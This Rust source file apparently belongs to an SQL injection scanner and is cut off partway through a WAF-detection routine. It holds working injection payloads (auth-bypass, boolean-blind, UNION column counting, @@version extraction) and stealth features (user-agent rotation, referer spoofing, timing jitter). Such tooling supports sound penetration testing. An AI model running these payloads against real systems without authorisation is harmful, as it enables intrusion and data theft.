//! Core SqliDetector struct: construction, URL/POST scanning, HTTP helpers,
//! and conversion of results to Finding objects.

use anyhow::{anyhow, Result};
use regex::Regex;
use reqwest::Client;
use std::collections::{HashMap, HashSet};
use std::time::{Duration, Instant};
use tracing::{debug, info, warn};

use crate::models::{Finding, Severity, Confidence};
use super::models::{
    HttpResponse, SqliConfig, SqliTechnique, SqliTestResult, SqliInfoExtraction,
};
use super::ai_advisor::{AiAdvisor, TargetContext};
use super::http::build_post_body;
use super::similarity::{calculate_similarity, detect_php_error, detect_sql_error, extract_version_from_error, extract_union_data};
use super::fingerprint::{TargetProber, TargetProfile, ParameterProfile};
use super::evasion::tamper_chain::TamperChain;
use super::session::SessionManager;
use std::sync::Arc;
use std::sync::atomic::{AtomicU64, AtomicUsize, Ordering};

/// Main SQL injection detector
#[derive(Clone)]
pub struct SqliDetector {
    pub(crate) client: Client,
    pub(crate) config: SqliConfig,
    pub(crate) oob_server: Option<Arc<crate::oob::OobServer>>,
    /// Session manager for authenticated scanning.
    /// Wrapped in Arc for safe concurrent access across tokio tasks.
    pub(crate) session: Option<Arc<SessionManager>>,
    /// Adaptive inter-request delay (ms). Grows when the target returns 429
    /// so that a scan against a rate-limited endpoint self-paces.
    pub(crate) adaptive_delay_ms: Arc<AtomicU64>,
    /// Optional cancellation token — when cancelled, all scan loops exit early.
    /// Set via `with_cancel_token` before starting the scan.
    pub(crate) cancel_token: Option<super::models::CancellationToken>,
    /// Total HTTP requests issued by this detector (incremented in send_request / send_post_request).
    pub(crate) request_count: Arc<AtomicUsize>,
    /// Dynamically adjusted SLEEP duration based on live baseline timing.
    /// When zero, falls back to `config.sleep_duration_secs`.
    pub(crate) adaptive_sleep_secs: Arc<AtomicU64>,
}

fn build_client(timeout: Duration, proxy: Option<&str>) -> Result<Client> {
    let mut b = Client::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .timeout(timeout);
    if let Some(p) = proxy {
        b = b.proxy(reqwest::Proxy::all(p)?);
    }
    b.build().map_err(|e| anyhow!("Failed to create HTTP client: {}", e))
}

impl SqliDetector {
    /// Create a new SQL injection detector
    pub fn new() -> Result<Self> {
        let client = build_client(Duration::from_secs(30), None)?;

        Ok(Self {
            client,
            config: SqliConfig::default(),
            oob_server: None,
            session: None,
            adaptive_delay_ms: Arc::new(AtomicU64::new(0)),
            cancel_token: None,
            request_count: Arc::new(AtomicUsize::new(0)),
            adaptive_sleep_secs: Arc::new(AtomicU64::new(0)),
        })
    }

    /// Create detector with custom config
    pub fn with_config(config: SqliConfig) -> Result<Self> {
        let client = build_client(
            Duration::from_secs(config.timeout_secs),
            config.proxy.as_deref(),
        )?;

        Ok(Self {
            client,
            config,
            oob_server: None,
            session: None,
            adaptive_delay_ms: Arc::new(AtomicU64::new(0)),
            cancel_token: None,
            request_count: Arc::new(AtomicUsize::new(0)),
            adaptive_sleep_secs: Arc::new(AtomicU64::new(0)),
        })
    }

    /// Attach a cancellation token. Call `token.cancel()` from another task/thread
    /// to stop the scan at the next safe checkpoint.
    pub fn with_cancel_token(mut self, token: super::models::CancellationToken) -> Self {
        self.cancel_token = Some(token);
        self
    }

    /// Returns true if a cancellation has been requested.
    #[inline]
    pub(crate) fn is_scan_cancelled(&self) -> bool {
        self.cancel_token.as_ref().map(|t| t.is_cancelled()).unwrap_or(false)
    }

    /// Total HTTP requests issued by this detector so far.
    pub fn request_count(&self) -> usize {
        self.request_count.load(Ordering::Relaxed)
    }

    /// If a session manager with auth is configured, perform login.
    /// Returns Ok(()) if no auth is configured or login succeeds.
    pub async fn ensure_authenticated(&self) -> Result<()> {
        if let Some(ref sess) = self.session {
            if sess.has_auth() {
                return sess.login(&self.client).await;
            }
        }
        Ok(())
    }

    /// Returns true if a session with authentication is attached.
    pub fn has_auth_session(&self) -> bool {
        self.session.as_ref().map(|s| s.has_auth()).unwrap_or(false)
    }

    /// Effective sleep duration for time-based tests.
    /// Returns the dynamically adjusted value if set, otherwise the config default.
    #[inline]
    pub(crate) fn sleep_duration_secs(&self) -> u64 {
        let adaptive = self.adaptive_sleep_secs.load(Ordering::Relaxed);
        if adaptive > 0 { adaptive } else { self.config.sleep_duration_secs }
    }

    /// Update the adaptive sleep duration based on live baseline timing.
    #[inline]
    pub(crate) fn set_adaptive_sleep(&self, secs: u64) {
        self.adaptive_sleep_secs.store(secs, Ordering::Relaxed);
    }

    /// Set OOB server for out-of-band detection
    pub fn with_oob_server(mut self, server: Arc<crate::oob::OobServer>) -> Self {
        self.oob_server = Some(server);
        self
    }

    /// Set session manager for authenticated scanning.
    /// All requests will include configured cookies, headers, and CSRF tokens.
    /// Accepts Arc<SessionManager> for safe concurrent access across tokio tasks.
    pub fn with_session(mut self, session: Arc<SessionManager>) -> Self {
        self.session = Some(session);
        self
    }

    /// Test a single URL for SQL injection vulnerabilities
    pub async fn test_url(&self, url: &str) -> Result<Vec<SqliTestResult>> {
        info!("Starting SQL injection scan against: {}", url);
        let mut results = Vec::new();

        let parsed_url = reqwest::Url::parse(url)?;
        let params: Vec<(String, String)> = parsed_url
            .query_pairs()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect();

        if params.is_empty() {
            warn!("No parameters found in URL: {}", url);
            let common_params: Vec<&str> = self.config.param_wordlist.iter().map(|s| s.as_str()).collect();
            for param in common_params {
                if self.is_scan_cancelled() { break; }
                let test_url = format!("{}?{}=1", url, param);
                if let Ok(param_results) = self.test_parameter(&test_url, param, "1").await {
                    results.extend(param_results);
                }
                tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
            }
        } else {
            for (param, value) in &params {
                if self.is_scan_cancelled() { break; }
                if let Ok(param_results) = self.test_parameter(url, param, value).await {
                    results.extend(param_results);
                }
                tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
            }
        }

        // Also probe injectable HTTP headers — many back-ends log X-Forwarded-For,
        // User-Agent, Referer, Cookie directly into DB tables without sanitization.
        let header_results = self.test_headers(url).await;
        results.extend(header_results);

        info!("SQL injection scan complete. Found {} vulnerabilities", results.len());
        Ok(results)
    }

    /// Test POST body parameters for SQL injection.
    ///
    /// `content_type`: `"form"` | `"json"` | `"xml"`
    pub async fn test_url_post(
        &self,
        url: &str,
        post_body: &str,
        content_type: &str,
    ) -> Result<Vec<SqliTestResult>> {
        info!("Starting POST SQL injection scan against: {} ({})", url, content_type);
        let mut results = Vec::new();

        let params: Vec<(String, String)> = match content_type {
            "json" => {
                match serde_json::from_str::<serde_json::Value>(post_body) {
                    Ok(serde_json::Value::Object(map)) => map
                        .into_iter()
                        .filter_map(|(k, v)| {
                            let val = match &v {
                                serde_json::Value::String(s) => s.clone(),
                                serde_json::Value::Number(n) => n.to_string(),
                                _ => return None,
                            };
                            Some((k, val))
                        })
                        .collect(),
                    _ => {
                        warn!("Failed to parse POST body as JSON");
                        vec![]
                    }
                }
            }
            "xml" => {
                let re = Regex::new(r"<([^/>\s]+)>([^<]*)</[^>]+>")
                    .unwrap_or_else(|_| Regex::new(r"x").unwrap());
                re.captures_iter(post_body)
                    .map(|cap| (cap[1].to_string(), cap[2].to_string()))
                    .collect()
            }
            _ => post_body
                .split('&')
                .filter_map(|pair| {
                    let mut parts = pair.splitn(2, '=');
                    let k = parts.next()?.to_string();
                    let v = parts.next().unwrap_or("").to_string();
                    Some((k, v))
                })
                .collect(),
        };

        if params.is_empty() {
            warn!("No parameters found in POST body");
            return Ok(results);
        }

        let ct_header = match content_type {
            "json" => "application/json",
            "xml"  => "application/xml",
            _      => "application/x-www-form-urlencoded",
        };

        let baseline = self
            .send_post_request(url, post_body.to_string(), ct_header)
            .await?;

        'param_loop: for (param, original_value) in &params {
            if self.is_scan_cancelled() { break 'param_loop; }

            // Phase 1: cheap error/time probe with a bare quote and double-quote.
            // Fires fast path for error-based and time-based findings.
            for probe in &["'", "\""] {
                let injected = format!("{}{}", original_value, probe);
                let modified_body = build_post_body(post_body, param, &injected, content_type);
                let resp = match self
                    .send_post_request(url, modified_body, ct_header)
                    .await
                {
                    Ok(r) => r,
                    Err(_) => continue,
                };

                if let Some(error_evidence) = detect_sql_error(&resp.body) {
                    results.push(SqliTestResult {
                        parameter: param.clone(),
                        technique: SqliTechnique::ErrorBased,
                        confidence: 0.9,
                        payload: probe.to_string(),
                        evidence: error_evidence,
                        dbms_hint: None,
                        injection_context: None,
                        payload_id: None,
                    });
                    tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
                    continue 'param_loop;
                }

                if resp.duration.as_secs() >= 5 {
                    results.push(SqliTestResult {
                        parameter: param.clone(),
                        technique: SqliTechnique::TimeBased,
                        confidence: 0.75,
                        payload: probe.to_string(),
                        evidence: format!("Response delayed: {}ms", resp.duration.as_millis()),
                        dbms_hint: None,
                        injection_context: None,
                        payload_id: None,
                    });
                    tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
                    continue 'param_loop;
                }
            }

            // Phase 2: boolean-blind context probe. Try each quote context with a
            // TRUE/FALSE pair; confirmed context determines the reported bypass.
            let is_numeric = original_value.parse::<i64>().is_ok();
            let contexts: Vec<(&str, String, String, String)> = if is_numeric {
                vec![
                    (
                        "numeric",
                        format!("{} AND 1=1", original_value),
                        format!("{} AND 1=2", original_value),
                        format!("{} OR 1=1-- ", original_value),
                    ),
                    (
                        "numeric-or",
                        format!("{} OR 1=1", original_value),
                        format!("{} OR 1=2", original_value),
                        format!("{} OR 1=1-- ", original_value),
                    ),
                    (
                        "single-quote",
                        format!("{}' AND '1'='1", original_value),
                        format!("{}' AND '1'='2", original_value),
                        format!("{}' OR '1'='1'-- ", original_value),
                    ),
                    (
                        "single-quote-or",
                        format!("{}' OR '1'='1", original_value),
                        format!("{}' OR '1'='2", original_value),
                        format!("{}' OR '1'='1'-- ", original_value),
                    ),
                    (
                        "double-quote",
                        format!("{}\" AND \"1\"=\"1", original_value),
                        format!("{}\" AND \"1\"=\"2", original_value),
                        format!("{}\" OR \"1\"=\"1\"-- ", original_value),
                    ),
                    (
                        "double-quote-or",
                        format!("{}\" OR \"1\"=\"1", original_value),
                        format!("{}\" OR \"1\"=\"2", original_value),
                        format!("{}\" OR \"1\"=\"1\"-- ", original_value),
                    ),
                ]
            } else {
                vec![
                    (
                        "single-quote",
                        format!("{}' AND '1'='1", original_value),
                        format!("{}' AND '1'='2", original_value),
                        format!("{}'-- ", original_value),
                    ),
                    (
                        "single-quote-or",
                        format!("{}' OR '1'='1", original_value),
                        format!("{}' OR '1'='2", original_value),
                        format!("{}' OR '1'='1'-- ", original_value),
                    ),
                    (
                        "double-quote",
                        format!("{}\" AND \"1\"=\"1", original_value),
                        format!("{}\" AND \"1\"=\"2", original_value),
                        format!("{}\"-- ", original_value),
                    ),
                    (
                        "double-quote-or",
                        format!("{}\" OR \"1\"=\"1", original_value),
                        format!("{}\" OR \"1\"=\"2", original_value),
                        format!("{}\" OR \"1\"=\"1\"-- ", original_value),
                    ),
                    (
                        "numeric",
                        format!("{} AND 1=1", original_value),
                        format!("{} AND 1=2", original_value),
                        format!("{} OR 1=1-- ", original_value),
                    ),
                    (
                        "numeric-or",
                        format!("{} OR 1=1", original_value),
                        format!("{} OR 1=2", original_value),
                        format!("{} OR 1=1-- ", original_value),
                    ),
                ]
            };

            for (ctx, true_pl, false_pl, bypass) in &contexts {
                let true_body = build_post_body(post_body, param, true_pl, content_type);
                let true_resp = match self
                    .send_post_request(url, true_body, ct_header)
                    .await
                {
                    Ok(r) => r,
                    Err(_) => continue,
                };
                tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;

                let false_body = build_post_body(post_body, param, false_pl, content_type);
                let false_resp = match self
                    .send_post_request(url, false_body, ct_header)
                    .await
                {
                    Ok(r) => r,
                    Err(_) => continue,
                };

                // Only skip on rate-limit or transport errors — a status change
                // between baseline and probe is a SIGNAL, not noise.
                if true_resp.status == 429 || false_resp.status == 429 {
                    debug!(
                        "Skip ctx={} on param={}: rate-limited (true={} false={})",
                        ctx, param, true_resp.status, false_resp.status
                    );
                    continue;
                }

                let true_sim = calculate_similarity(&baseline.body, &true_resp.body);
                let false_sim = calculate_similarity(&baseline.body, &false_resp.body);

                debug!(
                    "Boolean blind ctx={} param={}: true_sim={:.4} false_sim={:.4} gap={:.4}",
                    ctx, param, true_sim, false_sim, true_sim - false_sim,
                );

                // Pattern A: classic data-display boolean-blind.
                // TRUE probe matches baseline, FALSE probe diverges.
                // Use a relative gap instead of an absolute false_sim threshold so we
                // catch targets where TRUE/FALSE pages differ by only a few percent
                // (e.g. a different small image on success vs fail: ~3% body delta).
                let sim_gap = true_sim - false_sim;
                let classic = true_resp.status == baseline.status
                    && false_resp.status == baseline.status
                    && true_sim > 0.9
                    && sim_gap > 0.02;

                // Pattern B: auth-bypass. Probe the actual bypass payload.
                // If response differs strongly from baseline (status change or
                // big body delta), the injection closes the string context.
                let bypass_body_str = build_post_body(post_body, param, bypass, content_type);
                let bypass_resp = match self
                    .send_post_request(url, bypass_body_str, ct_header)
                    .await
                {
                    Ok(r) => r,
                    Err(_) => {
                        // If bypass probe fails, still fall through on Pattern A.
                        if classic {
                            info!(
                                "Boolean-blind confirmed on param={} context={} (T={:.2}, F={:.2})",
                                param, ctx, true_sim, false_sim
                            );
                            results.push(SqliTestResult {
                                parameter: param.clone(),
                                technique: SqliTechnique::BooleanBlind,
                                confidence: 0.9,
                                payload: bypass.clone(),
                                evidence: format!(
                                    "Context={} TRUE sim={:.0}%, FALSE sim={:.0}%. Bypass payload: {}",
                                    ctx, true_sim * 100.0, false_sim * 100.0, bypass
                                ),
                                dbms_hint: None,
                        injection_context: None,
                        payload_id: None,
                        });

                            break;
                        }
                        continue;
                    }
                };

                if bypass_resp.status == 429 {
                    debug!("Bypass probe rate-limited for ctx={} param={}", ctx, param);
                    // Fall through on Pattern A only.
                    if classic {
                        results.push(SqliTestResult {
                            parameter: param.clone(),
                            technique: SqliTechnique::BooleanBlind,
                            confidence: 0.9,
                            payload: bypass.clone(),
                            evidence: format!(
                                "Context={} TRUE sim={:.0}%, FALSE sim={:.0}%. Bypass payload: {}",
                                ctx, true_sim * 100.0, false_sim * 100.0, bypass
                            ),
                            dbms_hint: None,
                        injection_context: None,
                        payload_id: None,
                        });

                        break;
                    }
                    continue;
                }

                let bypass_sim = calculate_similarity(&baseline.body, &bypass_resp.body);
                let status_changed =
                    bypass_resp.status != baseline.status && bypass_resp.status < 500;
                let auth_bypass = status_changed || bypass_sim < 0.5;

                if classic || auth_bypass {
                    let (conf, evidence) = if auth_bypass {
                        (
                            0.95,
                            format!(
                                "Context={} auth-bypass confirmed: baseline status={} → bypass status={}, sim={:.0}%. Payload: {}",
                                ctx, baseline.status, bypass_resp.status, bypass_sim * 100.0, bypass
                            ),
                        )
                    } else {
                        (
                            0.9,
                            format!(
                                "Context={} TRUE sim={:.0}%, FALSE sim={:.0}%. Bypass payload: {}",
                                ctx, true_sim * 100.0, false_sim * 100.0, bypass
                            ),
                        )
                    };
                    info!(
                        "Boolean-blind confirmed on param={} context={} (auth_bypass={})",
                        param, ctx, auth_bypass
                    );
                    results.push(SqliTestResult {
                        parameter: param.clone(),
                        technique: SqliTechnique::BooleanBlind,
                        confidence: conf,
                        payload: bypass.clone(),
                        evidence,
                        dbms_hint: None,
                        injection_context: None,
                        payload_id: None,
                    });
                    break;
                }
            }

            // Phase 3: UNION-based detection via ORDER BY column count probe.
            // Skipped if we already found a vulnerability for this parameter.
            if results.iter().any(|r| r.parameter == *param) {
                tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
                continue;
            }

            if self.config.techniques.contains(&SqliTechnique::UnionBased) {
                // ORDER BY binary search: try ORDER BY 1..20 looking for an error
                // that reveals column count, then confirm with a UNION SELECT probe.
                let mut column_count: Option<usize> = None;
                let mut last_ok = 0usize;

                for i in 1..=20usize {
                    let order_payload = format!("{}' ORDER BY {}-- ", original_value, i);
                    let order_body = build_post_body(post_body, param, &order_payload, content_type);
                    match self.send_post_request(url, order_body, ct_header).await {
                        Ok(r) => {
                            if detect_sql_error(&r.body).is_some() {
                                if last_ok > 0 {
                                    column_count = Some(last_ok);
                                }
                                break;
                            }
                            last_ok = i;
                        }
                        Err(_) => break,
                    }
                    tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
                }

                // If ORDER BY didn't reveal count, try UNION SELECT NULL,... fallback.
                if column_count.is_none() && last_ok == 0 {
                    'union_count: for n in (1..=20usize).rev() {
                        let nulls = (0..n).map(|_| "NULL").collect::<Vec<_>>().join(",");
                        let union_payload = format!("{}' UNION SELECT {}-- ", original_value, nulls);
                        let union_body = build_post_body(post_body, param, &union_payload, content_type);
                        match self.send_post_request(url, union_body, ct_header).await {
                            Ok(r) => {
                                if detect_sql_error(&r.body).is_none() {
                                    let sim = calculate_similarity(&baseline.body, &r.body);
                                    // Response must differ from baseline to confirm injection took effect.
                                    if sim < 0.95 || r.status != baseline.status {
                                        column_count = Some(n);
                                        break 'union_count;
                                    }
                                }
                            }
                            Err(_) => {}
                        }
                        tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
                    }
                }

                if let Some(ncols) = column_count {
                    info!("POST UNION: found {} columns on param={}", ncols, param);
                    results.push(SqliTestResult {
                        parameter: param.clone(),
                        technique: SqliTechnique::UnionBased,
                        confidence: 0.88,
                        payload: format!(
                            "{}' UNION SELECT {}-- ",
                            original_value,
                            (1..=ncols).map(|n| n.to_string()).collect::<Vec<_>>().join(",")
                        ),
                        evidence: format!(
                            "POST UNION-based injection: {} columns detected via ORDER BY/UNION SELECT probe.",
                            ncols
                        ),
                        dbms_hint: None,
                        injection_context: None,
                        payload_id: None,
                    });
                }
            }

            tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
        }

        // Also probe injectable HTTP headers via POST — covers Less-18 style targets
        // that only log User-Agent / X-Forwarded-For when a POST request is submitted.
        let header_results = self.test_headers_post(url, post_body, content_type).await;
        results.extend(header_results);

        info!("POST SQL injection scan complete. Found {} vulnerabilities", results.len());
        Ok(results)
    }

    /// Test a parameter for server-side code injection (PHP eval, create_function, etc.)
    /// Must run before SQLi tests to avoid false positives from PHP error responses.
    pub(crate) async fn test_code_injection(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
    ) -> Option<SqliTestResult> {
        // A single quote breaks out of PHP string context — if we get a PHP error
        // but no SQL error, this is code injection, not SQLi.
        let probe = format!("{}'", original_value);
        let test_url = self.build_test_url(url, param, original_value, &probe);
        let resp = self.send_request(&test_url).await.ok()?;

        if detect_php_error(&resp.body) && detect_sql_error(&resp.body).is_none() {
            info!("PHP code injection detected on param={}", param);
            // Extract the specific PHP error for evidence
            let evidence_snippet = [
                "ParseError", "Parse error:", "Fatal error:",
                "syntax error, unexpected", "create_function", "eval()'d code",
                "runtime-created function",
            ]
            .iter()
            .find(|p| resp.body.contains(*p))
            .copied()
            .unwrap_or("PHP error in response");

            return Some(SqliTestResult {
                parameter: param.to_string(),
                technique: SqliTechnique::CodeInjection,
                confidence: 0.90,
                payload: probe,
                evidence: format!(
                    "PHP code injection — server eval'd user input. Indicator: '{}'. \
                     Not SQL injection. Check for eval(), create_function(), or similar constructs.",
                    evidence_snippet
                ),
                dbms_hint: None,
                        injection_context: None,
                        payload_id: None,
                        });

        }
        None
    }

    /// Test a specific parameter for SQL injection using all configured techniques
    pub(crate) async fn test_parameter(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
    ) -> Result<Vec<SqliTestResult>> {
        debug!("Testing parameter: {} = {}", param, original_value);
        let mut results = Vec::new();

        // Code injection check first — prevents false positive SQLi reports
        // when the server uses PHP eval/create_function on user input.
        if let Some(result) = self.test_code_injection(url, param, original_value).await {
            results.push(result);
            return Ok(results);
        }

        let baseline = self.send_request(url).await?;

        if self.config.techniques.contains(&SqliTechnique::ErrorBased)
            && let Some(result) = self.test_error_based(url, param, original_value, &baseline, None).await {
                results.push(result);
                return Ok(results);
            }

        if self.config.techniques.contains(&SqliTechnique::BooleanBlind)
            && let Some(result) = self.test_boolean_blind(url, param, original_value, &baseline, None).await {
                results.push(result);
                return Ok(results);
            }

        if self.config.techniques.contains(&SqliTechnique::TimeBased)
            && let Some(result) = self.test_time_based(url, param, original_value, None).await {
                results.push(result);
                return Ok(results);
            }

        if self.config.techniques.contains(&SqliTechnique::UnionBased)
            && let Some(result) = self.test_union_based(url, param, original_value, &baseline, None).await {
                results.push(result);
                return Ok(results);
            }

        if self.config.techniques.contains(&SqliTechnique::StackedQueries)
            && let Some(result) = self.test_stacked_queries(url, param, original_value, None).await {
                results.push(result);
                return Ok(results);
            }

        if self.config.techniques.contains(&SqliTechnique::OutOfBand)
            && let Some(result) = self.test_out_of_band(url, param, original_value, None).await {
                results.push(result);
                return Ok(results);
            }

        Ok(results)
    }

    /// Send HTTP GET request and return response details.
    /// If a session manager is configured, its cookies/headers are automatically applied
    /// and session cookies are updated from the response. CSRF tokens are auto-refreshed
    /// if stale (every 30s or on first request).
    pub async fn send_request(&self, url: &str) -> Result<HttpResponse> {
        // Auto-refresh CSRF token if needed before sending request
        if let Some(ref session) = self.session {
            session.maybe_refresh_csrf(&self.client).await;
        }

        let st = &self.config.stealth;

        // UA rotation
        let ua = if st.ua_rotation {
            crate::sqx::stealth::random_ua().to_string()
        } else {
            self.config.user_agent.clone()
        };

        // Optional referer spoofing — use the target's own origin
        let referer = if st.spoof_referer {
            crate::sqx::stealth::origin_of(url)
        } else {
            None
        };

        let start = Instant::now();
        let mut builder = self.client.get(url).header("User-Agent", &ua);

        // Realistic browser headers
        if st.mimic_browser_headers {
            for (k, v) in crate::sqx::stealth::browser_headers(referer.as_deref()) {
                builder = builder.header(k, v);
            }
        }

        // Apply session if configured
        if let Some(ref session) = self.session {
            builder = session.apply(builder);
        }

        let response = builder.send().await?;
        self.request_count.fetch_add(1, Ordering::Relaxed);

        // Update session cookies from response
        if let Some(ref session) = self.session {
            session.update_from_response(&response);

            // Auto-detect session cookies if not yet authenticated
            if !session.is_authenticated() && session.is_auto_detect_enabled() {
                let detected = session.detect_session_cookies(response.headers());
                if !detected.is_empty() {
                    for (name, value) in &detected {
                        info!("Auto-detected session cookie: {}={}", name, value);
                    }
                    session.insert_cookies(&detected);
                }
            }
        }

        let status = response.status().as_u16();
        let headers: std::collections::HashMap<String, String> = response
            .headers()
            .iter()
            .filter_map(|(k, v)| v.to_str().ok().map(|vs| (k.as_str().to_lowercase(), vs.to_string())))
            .collect();
        let body = response.text().await?;
        let duration = start.elapsed();

        Ok(HttpResponse { status, body, duration, headers })
    }

    /// Send a POST request with a raw body. Applies session + User-Agent.
    /// Retries up to 3 times with exponential backoff when the server returns 429.
    pub(crate) async fn send_post_request(
        &self,
        url: &str,
        body: String,
        content_type: &str,
    ) -> Result<HttpResponse> {
        let mut attempt: u32 = 0;
        loop {
            // Self-pace: sleep the current adaptive floor before sending.
            let floor = self.adaptive_delay_ms.load(Ordering::Relaxed);
            if floor > 0 {
                tokio::time::sleep(Duration::from_millis(floor)).await;
            }

            if let Some(ref session) = self.session {
                session.maybe_refresh_csrf(&self.client).await;
            }

            let st = &self.config.stealth;
            let ua = if st.ua_rotation {
                crate::sqx::stealth::random_ua().to_string()
            } else {
                self.config.user_agent.clone()
            };
            let referer = if st.spoof_referer {
                crate::sqx::stealth::origin_of(url)
            } else {
                None
            };

            let start = Instant::now();
            let mut builder = self
                .client
                .post(url)
                .header("Content-Type", content_type)
                .header("User-Agent", &ua)
                .body(body.clone());

            if st.mimic_browser_headers {
                for (k, v) in crate::sqx::stealth::browser_headers(referer.as_deref()) {
                    builder = builder.header(k, v);
                }
            }

            if let Some(ref session) = self.session {
                builder = session.apply(builder);
            }
            let resp = builder.send().await?;
            self.request_count.fetch_add(1, Ordering::Relaxed);
            if let Some(ref session) = self.session {
                session.update_from_response(&resp);
            }
            let status = resp.status().as_u16();
            let headers: std::collections::HashMap<String, String> = resp
                .headers()
                .iter()
                .filter_map(|(k, v)| v.to_str().ok().map(|vs| (k.as_str().to_lowercase(), vs.to_string())))
                .collect();
            let body_text = resp.text().await?;

            if status == 429 && attempt < 5 {
                let wait = Duration::from_secs(2u64 << attempt);
                // Grow the self-pacing floor so future requests spread out.
                let new_floor = (self.adaptive_delay_ms.load(Ordering::Relaxed) + 500).min(4000);
                self.adaptive_delay_ms.store(new_floor, Ordering::Relaxed);
                debug!(
                    "429 — backing off {:?}, adaptive floor now {}ms (attempt {})",
                    wait, new_floor, attempt + 1
                );
                tokio::time::sleep(wait).await;
                attempt += 1;
                continue;
            }

            return Ok(HttpResponse {
                status,
                body: body_text,
                duration: start.elapsed(),
                headers,
            });
        }
    }

    /// Build test URL with injected payload replacing the target parameter
    pub(crate) fn build_test_url(
        &self,
        url: &str,
        param: &str,
        _original_value: &str,
        payload: &str,
    ) -> String {
        let mut parsed_url = match reqwest::Url::parse(url) {
            Ok(u) => u,
            Err(_) => return url.to_string(),
        };

        let query_pairs: Vec<(String, String)> = parsed_url
            .query_pairs()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect();

        parsed_url.set_query(None);

        let mut param_found = false;
        {
            let mut serializer = parsed_url.query_pairs_mut();
            for (key, value) in query_pairs {
                if key == param {
                    serializer.append_pair(&key, payload);
                    param_found = true;
                } else {
                    serializer.append_pair(&key, &value);
                }
            }
            if !param_found {
                serializer.append_pair(param, payload);
            }
        }

        parsed_url.to_string()
    }

    /// Convert SQX results to Finding objects
    pub fn results_to_findings(&self, results: Vec<SqliTestResult>, url: &str) -> Vec<Finding> {
        use chrono::Utc;
        use uuid::Uuid;

        results
            .into_iter()
            .map(|result| Finding {
                id: Uuid::new_v4().to_string(),
                timestamp: Utc::now(),
                tool: "sqx".to_string(),
                severity: match result.technique {
                    SqliTechnique::ErrorBased => Severity::High,
                    SqliTechnique::BooleanBlind => Severity::High,
                    SqliTechnique::TimeBased => Severity::High,
                    SqliTechnique::UnionBased => Severity::Critical,
                    SqliTechnique::StackedQueries => Severity::Critical,
                    SqliTechnique::OutOfBand => Severity::High,
                    SqliTechnique::SecondOrder => Severity::Critical,
                    SqliTechnique::CodeInjection => Severity::Critical,
                },
                confidence: if result.confidence > 0.9 {
                    Confidence::Certain
                } else {
                    Confidence::Firm
                },
                title: format!("SQL Injection ({})", result.technique),
                description: format!(
                    "Parameter '{}' is vulnerable to {} SQL injection. {}",
                    result.parameter, result.technique, result.evidence
                ),
                url: url.to_string(),
                request_id: None,
                evidence: Some(format!(
                    "Payload: {}\nEvidence: {}",
                    result.payload, result.evidence
                )),
                remediation: Some(
                    "Use parameterized queries/prepared statements. Validate and sanitize all user input."
                        .to_string(),
                ),
                cve_id: None,
                cvss_score: Some(9.8),
                tags: vec![
                    "sql-injection".to_string(),
                    result.technique.to_string().to_lowercase().replace(' ', "-"),
                ],
                raw_output: serde_json::to_string(&result).unwrap_or_default(),
            })
            .collect()
    }

    /// Extract basic info via SQL injection (if vulnerability confirmed)
    pub async fn extract_info(
        &self,
        url: &str,
        param: &str,
        technique: &SqliTechnique,
    ) -> Result<SqliInfoExtraction> {
        let mut info = SqliInfoExtraction::default();

        match technique {
            SqliTechnique::ErrorBased => {
                let version_payloads = [
                    "' AND 1=CONVERT(int, @@version)-- ",
                    "' AND 1=CAST(@@version AS int)-- ",
                    "' AND 1=1/@@version-- ",
                ];
                for payload in &version_payloads {
                    let test_url = self.build_test_url(url, param, "1", payload);
                    if let Ok(response) = self.send_request(&test_url).await
                        && let Some(version) = extract_version_from_error(&response.body) {
                            info.version = Some(version);
                            break;
                        }
                }
            }
            SqliTechnique::UnionBased => {
                let union_payload = "-1' UNION SELECT 1,@@version,3,4,5,6,7,8,9,10-- ";
                let test_url = self.build_test_url(url, param, "1", union_payload);
                if let Ok(response) = self.send_request(&test_url).await {
                    info.version = extract_union_data(&response.body, 2);
                    info.user = extract_union_data(&response.body, 1);
                }
            }
            _ => {}
        }

        Ok(info)
    }

    /// Scan with behavioral fingerprinting (recommended entry point).
    /// Phase 1: Fingerprint the target (~10-15 benign probes).
    /// Phase 2: Run injection tests using the strategy derived from the profile.
    pub async fn scan_smart(&self, url: &str) -> Result<(TargetProfile, Vec<SqliTestResult>)> {
        // Phase 1: Fingerprint
        let mut prober = TargetProber::new(
            self.client.clone(),
            Duration::from_secs(self.config.timeout_secs),
            self.config.user_agent.clone(),
        );
        if let Some(ref session) = self.session {
            prober = prober.with_session(session.clone());
        }
        let profile = prober.profile(url).await?;

        info!(
            "Target profile: WAF={:?}, DBMS={:?}, strategy={:?}",
            profile.waf.as_ref().map(|w| &w.name),
            profile.dbms_hint,
            profile.strategy.technique_order
        );

        // Phase 2: Scan using strategy
        let results = self.scan_with_strategy(url, &profile).await?;

        Ok((profile, results))
    }

    /// Detect if a response looks like a WAF block rather than a normal "not vulnerable" response.
    fn is_waf_blocked(resp: &HttpResponse, waf_block_status: Option<u16>) -> bool {
        // Match known block status codes
        if matches!(resp.status, 403 | 406 | 429 | 503) {
            return true;
        }
        // Match the fingerprinted WAF's specific block status
        if let Some(expected) = waf_block_status {
            if expected != 0 && resp.status == expected {
                return true;
            }
        }
        // Detect WAF block signatures in body
        let body_lower = resp.body.to_lowercase();
        let waf_signatures = [
            "access denied", "blocked", "forbidden", "not acceptable",
            "security violation", "attack detected", "cloudflare",
